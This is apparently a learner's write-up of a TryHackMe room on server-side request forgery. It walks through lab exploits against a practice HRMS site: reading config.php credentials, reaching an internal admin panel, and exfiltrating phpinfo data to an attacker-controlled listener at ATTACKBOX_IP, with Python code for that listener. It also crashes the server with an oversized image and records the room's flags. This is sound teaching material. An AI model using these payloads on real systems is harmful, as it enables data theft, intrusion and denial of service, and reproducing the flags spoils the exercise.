# Introduction
---

The landscape of web attacks constantly evolves, with threat actors devising sophisticated methods to compromise systems. As each day passes, the expansion of web-based threats warrants the need forÂ **robust cyber security measures**Â to counter the ever-advancing tactics employed by malicious actors. In this room, we will discuss a similar attack known asÂ **Server Side Request Forgery (SSRF)**.

SSRFÂ is a web application security vulnerability that allows the attacker to force the server to makeÂ **unauthorized requests to any local or external source**Â on behalf of the web server.Â SSRFÂ **allows an attacker to interact with internal systems**, potentially leading to data leaks, service disruption, or even remote code execution.  

Learning Objectives

- Understanding the workings ofÂ SSRF
- Practically testing various types ofÂ SSRF
- Few important tools for exploitation
- Key mitigation and defensive measures

Learning Prerequisites  
Having completed the following rooms before starting this one is recommended:

- [How websites work](https://tryhackme.com/room/howwebsiteswork)
- [Protocol and Servers](https://tryhackme.com/room/protocolsandservers)
- [OWASPÂ Top 10](https://tryhackme.com/room/owasptop10)


# Anatomy of SSRF Attack
----

When developing networked software, it's common to make requests to external servers. Developers often use these requests toÂ **fetch remote resources**Â like software updates or import data from other applications. While these requests are typically safe,Â **improper implementation can lead to a vulnerability known asÂ SSRF**.Â 

AnÂ SSRFÂ vulnerability can arise when user-provided data is used to construct a request, such as forming a URL. To execute anÂ SSRFÂ attack,Â **an attacker can manipulate a parameter value within the vulnerable software**, effectively creating or controlling requests from that software and directing them towards other servers or even the same server.

SSRFÂ vulnerabilities can be found in various types of computer software across a wide range of programming languages and platforms as long as the software operates in a networked environment. While mostÂ SSRFÂ vulnerabilities are commonly discovered in web applications and other networked software, they can also be present in server software.

## OWASPÂ Ranking

SSRFÂ is a formidable security threat, earning a spot inÂ [OWASP's top 10 list](https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/), making it imperative to understand and defend against it as it jeopardizes data integrity and application security. As perÂ OWASP, factors regardingÂ SSRFÂ are mentioned below:

|   |   |   |   |   |   |   |
|---|---|---|---|---|---|---|
|**Max Incidence Rate**|**Avg Incidence Rate  <br>**|**Avg Weighted Exploit**|**Avg Weighted Impact  <br>**|**Max Coverage  <br>**|**Total Occurrences  <br>**|**Total CVEs**|
|2.72%|2.72%|8.28|6.72|67.2%|9503|385|

The above table provides insights into the **prevalence, impact, and coverage** of an SSRF vulnerability in a specific context or dataset that OWASP measures. The interpretation of the above table is explained below:

- **Max Incidence Rate**: It suggests how often this vulnerability has been encountered relative to other vulnerabilities inÂ OWASP.
- **Avg Incidence Rate**: It shows how common this vulnerability is compared to others.
- **Avg Weighted Exploit**: Indicate the average difficulty or effort required to exploit anÂ SSRFÂ vulnerability.
- **Avg Weighted Impact**: Average potential impact or severity of exploiting anÂ SSRFÂ vulnerability.
- **Max Coverage**: It indicates how much of the systems have been exploited due to this vulnerability.
- **Total Occurrences**: Total exploitations due to this vulnerability thatÂ OWASPÂ has analyzed.
- **Total CVEs**: Total CVEs aboutÂ SSRF. These areÂ CVE-2021-21311,Â CVE-2018-11759 andÂ CVE-2017-9506. This data ofÂ OWASPÂ is from 2021.

**Note**: TheÂ SSRFÂ vulnerability ranks 7th in theÂ [OWASPÂ APIÂ Security Top 10](https://owasp.org/API-Security/editions/2023/en/0xa7-server-side-request-forgery/).

## Risk ofÂ SSRF

### **Data Exposure**

As explained earlier, cybercriminals can gain unauthorized access by tampering with requests on behalf of the vulnerable web application to gain access to sensitive data hosted in the internal network.

### **Reconnaissance**

An attacker can carry out port scanning of internal networks by running malicious scripts on vulnerable servers or redirecting to scripts hosted on some external server.

### **Denial of Service**

It is a common scenario that internal networks or servers do not expect many requests; therefore, they are configured to handle low bandwidth. Attackers can flood the servers with multiple illegitimate requests, causing them to remain unavailable to handle genuine requests.


# Types of SSRF - Basic
---

 BasicÂ SSRFÂ is a web attack technique where an attacker tricks a server into making requests on their behalf, often targeting internal systems or third-party services. By exploiting vulnerabilities in input validation, the attacker can gain unauthorised access to sensitive information or control over remote resources, posing a significant security risk to the targeted application and its underlying infrastructure.

A basicÂ SSRFÂ can be employed against a local or an internal server. We will discuss both scenarios in detail.

Scenario - I:Â SSRFÂ Against a Local Server  

In this attack, the attacker makes an unauthorized request to the server hosting the web application. The attacker typically supplies a loopback IP address or localhost to receive the response. The vulnerability arises due to how the application handles input from the query parameter orÂ APIÂ calls.Â 

For example, in the HRMS application, there's a feature that loads additional pages based on a URL parameter. For example, navigating toÂ `http://hrms.thm?url=localhost/copyright`Â would load the copyright page of the application. This feature is intended for internal use and is designed to request and display pages from the local server (hence usingÂ `localhost`Â in the query).

However, due to insufficient validation of the input URL, an attacker can manipulate this functionality for SSRF attacks. By changing the URL parameter to point to other pages/services, the attacker can force the HRMS server to make requests to other pages. For instance, if the attacker uses a URL likeÂ `http://hrms.thm/?url=localhost/config`, andÂ `config`Â is a valid page, the HRMS server will attempt to fetch content from this page and display the result.Â 

The main idea is to forge a legitimate request and make the server perform an unintended action.  

**How it works**

- Suppose you have been tasked to pentest the HRMS website and identify any SSRF loopholes. Visit the HRMS websiteÂ `http://hrms.thm`, and you will see that the login page is protected through a username and password.

![how to login in the HRMS app](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/07aeec8ece2fdc0a25ab67b527e35a47.png)  

- We will notice that once we visit the pageÂ `http://hrms.thm`[](http://hrms.thm/), it automatically redirects toÂ `http://hrms.thm/?url=localhost/copyright`.Â The webpage shows the copyright status of the website.

![footer with copyright status](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/08f69d021a9f881f75749e0ce21ae08f.png)

- This means the developer has probably made some mistakes while handling a file showing the copyright status. Here is the code of the page that takes the query parameter.

Vulnerable Script

```shell-session
$uri = rtrim($_GET['url'], "/");
...					
$path = ROOTPATH . $file;
...
if (file_exists($path)) {
  echo "<pre>";
  echo htmlspecialchars(file_get_contents($path));
  echo "</pre>";
  } else { ?>
    <p class="text-xl"><?= ltrim($file, "/") ?> is not found</p>
 <?php
... 
 
```

- We can see in the above code that the input parameterÂ `url`Â lacks adequate filtering and loads whatever the parameter is provided from theÂ `localhost`.
- Let's try to change the URL fromÂ `http://hrms.thm/?url=localhost/copyright`Â toÂ `http://hrms.thm/?url=localhost/hello`; it displays an error thatÂ `hello.php is not found`.

![Test file code hello.php](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/8566f87e51f767f1bdfde449ac1018f1.png)

- Woah! So, the page calls anotherÂ PHPÂ file and displays it on the current page's footer. What if we call sensitive files likeÂ `connection.php`Â orÂ `config.php`?  
    
- When we try to access the fileÂ `http://hrms.thm/?url=localhost/config`, we will see that the footer of the page shows the content of the file, essentially showing us the exact credentials, which would look like this:

config.php

```shell-session
<?php 
$adminURL = "xxxxxxx";
$username = "xxxxx"; 
$password = "xxxx"; 
...
?>
```

In this task, we have learned how a small mistake while handling file input can enable bad actors to take control of the application. As a penetration tester, it's crucial to know that BasicÂ SSRFÂ vulnerabilities are frequently present across various types of websites, including e-commerce, banking, management systems, and more, particularly in features involving file handling or external resource fetching.

![Pasted image 20250506155106.png](../../../IMAGES/Pasted%20image%2020250506155106.png)

![Pasted image 20250506155220.png](../../../IMAGES/Pasted%20image%2020250506155220.png)

Got our flag:

```
THM_{1NiT_S$rF} 
```

# Types of SSRF - Basic (Continued)
---
In this task, we will continue learning basicÂ SSRFÂ techniques and will dive into the second scenario.  

Scenario - II: Accessing an Internal Server

In complex web applications, it is common for front-end web applications to interact with back-end internal servers. These servers are generally hosted onÂ **non-routable IP addresses**, so an internet user cannot access them. In this scenario, an attacker exploits a vulnerable web application's input validation to trick the server into requestingÂ **internal resources on the same network**. They could provide a malicious URL as input, making the server interact with the internal server on their behalf.

For instance, if an internal server provides database management or administrative controls, the attacker could craft a URL that initiates an unintended action on these internal systems when processed by the vulnerable web application.Â Technically, this is achieved through manipulated input, such as special IP addresses (likeÂ `192.168.x.x`Â orÂ `10.x.x.x`Â for IPv4) or domain names (e.g.,Â `internal-database.hrms.thm`). When not properly sanitised, these inputs can be used in functions like HTTP requests or file inclusions within the web application. The server, interpreting these requests as legitimate, then inadvertently performs actions or retrieves data from other internal services.

Moreover, since these internal servers may lack the same level of security monitoring as external-facing servers, such exploitation can often go unnoticed. The attacker might also use this method to perform reconnaissance within the internal network, identifying other vulnerable systems or services to target.  

**How it works**

- In this case, we will try to access the inaccessible internal resources through direct request.
- Now that we have acquired the credentials for the login panel, we will log in to the dashboard.
- Once we log in to the HRMS web app, we will see a dashboard listing employees and their departments. There is a dropdown that shows employees' data and salary.  
    

![Dashboard for the HRMS app](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/79c36e256f8be882f268675b1188b231.png)

- From the config file, we can see that the admin panel is hosted atÂ `http://192.168.2.10/admin.php`. If we try to log in to the admin panel, it is not accessible directly. Let's try to access it; it will show an error.

![inaccessible admin dashboard](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/ec6b8913193b20e30914d151620c3c4b.png)  

- We have no route to that IP as it's a private network IP and can only be accessed by a machine within the same network.
- If we check the source of the HTML, it shows that the dropdown takes the URL from anÂ **internal system**Â and renders the data. The details of all employees are being rendered fromÂ `http://192.168.2.10/employees.php`.

![Employee page HRMS web page](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/0123917ba4d9d0f89131a586bdaf44e9.png)

- That's great, so the dropdown is accessing an internal system; what if we try to change the request such that instead of loading the employee page, we forge the request and sendÂ `http://192.168.2.10/admin.php`Â as a parameter to the server?
- Let's do that. Use the Inspect Element option and change the drop down value of salary fromÂ `http://192.168.2.10/salary.php`Â toÂ `http://192.168.2.10/admin.php`Â as shown below:

![How to do forge request through drop down](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/9457320f0396c8ee6da80e44623c9212.png)  

- Once you update the value, choose theÂ `Salary`Â option from theÂ `Select Category`Â dropdown.

![Salary dropdown](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/676320914b2d5c7c61896d634f400b95.png)  

![Pasted image 20250506155612.png](../../../IMAGES/Pasted%20image%2020250506155612.png)

Flag is:

```
THM_{B@$ic_s$rF}
```

# Types of SSRF - Blind
---

ï»¿BlindÂ SSRFÂ refers to a scenario where the attacker can send requests to a target server, but they do not receive direct responses or feedback about the outcome of their requests. In other words, the attacker is blind to the server's responses. This type ofÂ SSRFÂ can be more challenging to exploit because the attacker cannot directly see the results of their actions. We will discuss its various examples.

### BlindÂ SSRFÂ With Out-Of-BandÂ 
---

Out-of-bandÂ SSRFÂ is a technique where the attacker leverages a separate, out-of-band communication channel instead of directly receiving responses from the target server to receive information or control the exploited server. This approach is practical when the server's responses are not directly accessible to the attacker.

For instance, the attacker might manipulate the vulnerable server to make aÂ DNSÂ request to a domain he owns or to initiate a connection to an external server with specific data. This external interaction provides the attacker with evidence that theÂ SSRFÂ vulnerability exists and potentially allows him to gather additional information, such as internal IP addresses or the internal network's structure.  

**How it works**

- Once again, log in to the dashboard and click on theÂ `Profile`Â tab in the navigation bar.Â We will see that it redirects toÂ `http://hrms.thm/profile.php?url=localhost/getInfo.php`, which displays a message that data is being sent.

![profile page on the HRMS app](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/0ef2a2a8940fb66215b3c543e2d89134.png)  

- What is happening here?Â Once we loadÂ `profile.php`, it sends data to an external page namedÂ `getInfo.php`, which is probably used for analytics or logs.

profile.php

```php
<?php
...
$targetUrl = $_GET['url'];
ob_start();
ob_start();
phpinfo();
$phpInfoData = ob_get_clean();
$ch = curl_init($targetUrl); 
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS,$phpInfoData);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch); 
...
?>
```

- Source code analysis of the page shows that it is readingÂ `url`Â parameters, and without performing any validation, it sends the information to the server mentioned in theÂ `url`Â parameter.Â 
- Here, an attacker can redirect the request to their server, thus getting additional information for exploitation or data pilferage.Â 
- On your AttackBox, create a new file calledÂ `server.py`Â and add the following code to it:  
    

server.py

```python
from http.server import SimpleHTTPRequestHandler, HTTPServer
from urllib.parse import unquote
class CustomRequestHandler(SimpleHTTPRequestHandler):

    def end_headers(self):
        self.send_header('Access-Control-Allow-Origin', '*')  # Allow requests from any origin
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        super().end_headers()

    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'Hello, GET request!')

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')

        self.send_response(200)
        self.end_headers()

        # Log the POST data to data.html
        with open('data.html', 'a') as file:
            file.write(post_data + '\n')
        response = f'THM, POST request! Received data: {post_data}'
        self.wfile.write(response.encode('utf-8'))

if __name__ == '__main__':
    server_address = ('', 8080)
    httpd = HTTPServer(server_address, CustomRequestHandler)
    print('Server running on http://localhost:8080/')
    httpd.serve_forever()
```

- The above code will receive all the content and save it to a file data.html on the server.Â To obtain the data, we first need to start a lightweight server. We can do this inÂ `AttackBox`Â by using the following commands:

```shell-session
thm@machine$ sudo chmod +x server.py && sudo python3 server.py
```

- Now open the browser and openÂ `http://hrms.thm/profile.php?url=http://ATTACKBOX_IP:8080`, which will log the data in theÂ `data.html`. Open theÂ `data.html`Â file, which contains all the essential information related to the server that can be used to launch further attacks.


After analyzing the data, we can get:

```
The value for Virtual Directory Support isÂ disabled.

The value of the PHP Extension Build isÂ API20190902,NTS.
```


![Intercepted file image](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/8f499d3348f74b47f9f647a63041ae81.png)

### Semi-BlindÂ SSRFÂ (Time-based)  

Time-basedÂ SSRFÂ is a variation ofÂ SSRFÂ where the attacker leverages timing-related clues or delays to infer the success or failure of their malicious requests. ByÂ **observing how long it takes for the application to respond**, the attacker can make educated guesses about whether theirÂ SSRFÂ attack was successful.Â 

The attacker sends a series of requests, each targeting a different resource or URL. The attacker measures the response times for each request. If a response takes significantly longer, it may indicate that the server successfully accessed the targeted resource, implying a successfulÂ SSRFÂ attack.

# A Classic Example - Crashing the Server
----

An attacker could abuseÂ SSRFÂ by crashing the server or creating a denial of service for other hosts.Â There are multiple instancesÂ ([WordPress](https://www.sonarsource.com/blog/wordpress-core-unauthenticated-blind-ssrf/),Â [CairoSVG](https://github.com/Kozea/CairoSVG/security/advisories/GHSA-rwmf-w63j-p7gv)) where attackers try to disrupt the availability of a system by launchingÂ SSRFÂ attacks.Â 

Crashing the Server  

In thisÂ SSRFÂ demonstration, we will illustrate how an attacker can exploit a web application to cause a denial of service on the server. In our scenario, the vulnerability is exploited by supplying a malicious URL that points to a resource which, when accessed by the server, leads to excessive resource consumption or triggers a crash.

For example, the attacker might input a URL pointing to a large file on a slow server or a service that responds with an overwhelming amount of data. When the vulnerable application naively accesses this URL, it engages in an action that exhausts its own system resources, leading to a slowdown or complete crash.

**How it works**

- Once we log in to the dashboard, we will see a tab calledÂ `Training`Â in the navigation bar, which is used to load the training content for the employees.
- Once we click on that tab, we will see that it redirects to the URLÂ `http://hrms.thm/url.php?id=192.168.2.10/trainingbanner.jpg`[](http://hrms.thm/url.php=10.10.19.1/trainingbanner.jpg), which shows training content.

![training content page on HRMS page](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/57fae798d14a3defe4c057d3926dd49d.png)  

- We notice that theÂ `url.php`Â file is loading external content displayed here. What if we try to load any other content?
- Try opening the fileÂ `http://hrms.thm/url.php?id=10.10.10.10`. Great! - it opened the file for you.Â 

![Access to 10.10.10.10 page through SSRF](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/1254a5139518aff6b8d898889e4cde3f.png)  

- Now that we know the server is vulnerable to basic SSRF, let's explore the code ofÂ `url.php`Â to make it crash the server.
- Once we access the URLÂ `http://hrms.thm/?url=localhost/url`, we will see the following code at the footer (only works if the user is not logged in).

url.php

```php
<?php
....
....
    if ($imageSize < 100) {
		  // Output the image if it's within the size limit
    
		$base64Image = downloadAndEncodeImage($imageUrl);
        echo '<img src="' . htmlspecialchars($base64Image) . '" alt="Image" style="width: 100%; height: 100%; object-fit: cover;">';

    } else {
	 	// Memory Outage - server will crash
    
....
...
```

- The above code shows that theÂ `url.php`Â loads an image; if the image size exceedsÂ `100KB`, it shows a memory outage message and throws an error.
- Let's try to crash the server by loading an image greater than 100 KB. For your convenience, we already have such an image available, which you can forge viaÂ `http://hrms.thm/url.php?id=192.168.2.10/bigImage.jpg`.

![Pasted image 20250506160410.png](../../../IMAGES/Pasted%20image%2020250506160410.png)


Flag is:

```
THM_{$$rF_Cr@$h3D}
```

We can see that the threat posed byÂ SSRFÂ vulnerabilities extends beyond unauthorized data access or internal network exposure; it also includes the potential to disrupt or completely incapacitate critical server operations. By manipulating a vulnerable server to make unintended requests, attackers can overload the system, leading to crashes that result in denial of service.

# Remedial Measures
---

Mitigation measures forÂ SSRFÂ are essential for preserving the security and integrity of web applications. Implementing robustÂ SSRFÂ mitigation measures helps protect against these risks byÂ fortifying the application's defences, preventing malicious requests, and bolstering the overall security posture. As a critical element of web application security,Â SSRFÂ mitigation measures are instrumental in preserving user data, safeguarding against data breaches, and maintaining trust in the digital ecosystem. A few of the important policies are mentioned below:

![Various techniques for mitigation](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/24147651267eedd828e4c103b84795d9.svg)  

- **Implement strict input validation**Â and sanitise all user-provided input, especially any URLs or input parameters the application uses to make external requests.
- Instead of trying toÂ blocklist or filter out disallowed URLs,Â **maintain allowlists of trusted URLs or domains**. Only allow requests to these trusted sources.
- **Implement network segmentation**Â to isolate sensitive internal resources from external access.
- **Implement security headers**, such as Content-Security-Policy, that restricts the application's load of external resources.  
    
- **Implement strong access controls**Â for internal resources, so even if an attacker succeeds in making a request, they can't access sensitive data without proper authorisation.
- **Implement comprehensive logging and monitoring**Â to track and analyze incoming requests. Look for unusual or unauthorized requests and set up alerts for suspicious activity.
